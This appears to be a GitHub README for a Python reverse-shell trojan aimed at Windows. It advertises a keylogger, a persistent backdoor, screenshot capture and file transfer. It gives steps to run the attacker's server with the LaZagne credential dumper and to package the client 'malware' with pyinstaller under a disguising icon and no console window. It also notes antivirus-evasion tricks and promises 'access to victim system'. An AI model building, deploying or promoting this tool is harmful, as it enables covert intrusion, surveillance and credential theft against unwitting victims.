# Reverse-shell-windows
Reverse shell for windows operating system
# Social media analytics
## Project overview
Reverse Shell for Windows written in Python3 

## Features
Currently this program has several features such as:
* Multi-client support
* Built-in keylogger
* Send command to all clients
* Capture screenshots
* Upload/download files
* Send messages
* Persistent backdoor
* Ability to browse files
* Open remote cmd
* Ability to shutdown/restart/lock pc
* And more...
### Usage

#### 1. Install Python
Install ```python-3.7.2``` and ```python-pip```. Follow the steps from the below reference document based on your Operating System.
Reference: [https://docs.python-guide.org/starting/installation/](https://docs.python-guide.org/starting/installation/)


#### 2. Clone git repository
```bash
git clone "https://github.com/ramkishor-hosamane/Reverse-shell-windows.git"
```

#### 3. Install requirements in server (hacker machine) 
```bash
pip3 install -r requirements.txt
```
Also copy lazagne.exe along with server.py to server machine
#### 4. Run the server
```bash
python3 server.py
```
#### 5. Craft client file (the malware)
change ip address of host to servers ip address in client.py file. To do so find 114th line in client.py fill the ip address.(To by pass antivirus i have commented lines with some random text in between)
```bash
pyinstaller.exe --onefile --icon=youricon.ico --noconsole --add-data="dat;." client.py
```
#### 6. Run the malware in windows operating system 

#### 7. You'll Get access to victim system in server system 
